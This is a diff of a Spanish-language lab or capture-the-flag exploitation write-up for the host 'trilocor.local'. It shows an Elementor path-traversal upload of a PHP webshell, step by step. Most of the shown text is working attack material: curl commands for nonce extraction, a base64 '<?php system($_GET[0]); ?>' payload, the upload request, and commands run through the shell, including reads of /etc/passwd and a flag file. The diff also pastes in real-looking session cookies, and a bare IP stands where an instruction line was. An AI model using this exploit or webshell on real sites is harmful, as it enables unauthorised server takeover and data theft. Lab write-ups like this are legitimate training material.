@@ -186,27 +186,23 @@ Se requiere una sesión autenticada con rol **Editor** (cumple el umbral Contrib
 ---
 
 ## Pasos de reproducción
-
-> Reemplazar `MI_IP` por la IP del atacante en la VPN y `COOKIE` por la cookie de sesión válida de `web-editor` (obtenible del navegador en DevTools → Cookies, o vía el robo de cookie por XSS).
-
+10.10.14.22
 ### 1. Definir la sesión autenticada
 
 ```bash
-COOKIE='wordpress_logged_in_828ff7d64a441f8aab6a0310bdcee6a9=<VALOR>; wordpress_828ff7d64a441f8aab6a0310bdcee6a9=<VALOR>'
+COOKIE='wordpress_logged_in_828ff7d64a441f8aab6a0310bdcee6a9=web-editor%7C1782155957%7CqP0CX69YENag9XhP37yAHV5ElveYZaVclxPglba8Gwe%7Ca33f9ccaf3183d5e54e722f4c67077c726443cfd947574b7a72230fcd0bb705c; wordpress_828ff7d64a441f8aab6a0310bdcee6a9=web-editor%7C1782155957%7CqP0CX69YENag9XhP37yAHV5ElveYZaVclxPglba8Gwe%7C84a1f23a5cfb0099c09d7d152f58f1d9920cefa251994718010c3104ef8e2088'
 ```
 
 ### 2. Obtener el nonce de Elementor
 
 Elementor publica el nonce para sus llamadas AJAX en la configuración embebida de cualquier página del editor. Se extrae con la sesión autenticada:
-
 ```bash
 NONCE=$(curl -s -b "$COOKIE" 'http://admin.trilocor.local/wp-admin/post.php?post=22&action=elementor' \
   | grep -oP '"ajax":\{"url":"[^"]+","nonce":"\K[a-z0-9]+')
 echo "Nonce: $NONCE"
 ```
 
-Salida esperada (ejemplo):
-
+Salida esperada:
 ```
 Nonce: d0cab1a2f0
 ```
@@ -220,7 +216,6 @@ PAYLOAD=$(echo -n '<?php system($_GET[0]); ?>' | base64)
 ### 4. Subir el webshell mediante el importador vulnerable
 
 La petición se envía como POST `application/x-www-form-urlencoded` (no es un upload multipart). El archivo se escribe en el directorio temporal de Elementor; con `fileName=/../shell.php` el traversal lo deja en `wp-content/uploads/elementor/tmp/shell.php`.
-
 ```bash
 curl -s -i -b "$COOKIE" 'http://admin.trilocor.local/wp-admin/admin-ajax.php' \
   --data-urlencode 'action=elementor_library_direct_actions' \
@@ -241,16 +236,14 @@ curl 'http://admin.trilocor.local/wp-content/uploads/elementor/tmp/shell.php?0=i
 ```
 
 **Prueba (salida obtenida):**
-
 ```
 uid=33(www-data) gid=33(www-data) groups=33(www-data)
 ```
 
 El webshell queda accesible **sin necesidad de autenticación**, y permite ejecutar comandos arbitrarios pasándolos por el parámetro `0`, por ejemplo:
-
 ```bash
-curl 'http://admin.trilocor.local/wp-content/uploads/elementor/tmp/shell.php?0=whoami'
-curl --data-urlencode '0=cat /etc/passwd' ...   # (o vía GET URL-encodeado)
+curl 'http://admin.trilocor.local/wp-content/uploads/elementor/tmp/shell.php?0=ls+/'
+curl 'http://admin.trilocor.local/wp-content/uploads/elementor/tmp/shell.php?0=cat+/b553866867105672af6c914b09070105.txt'
 ```
 
 ---
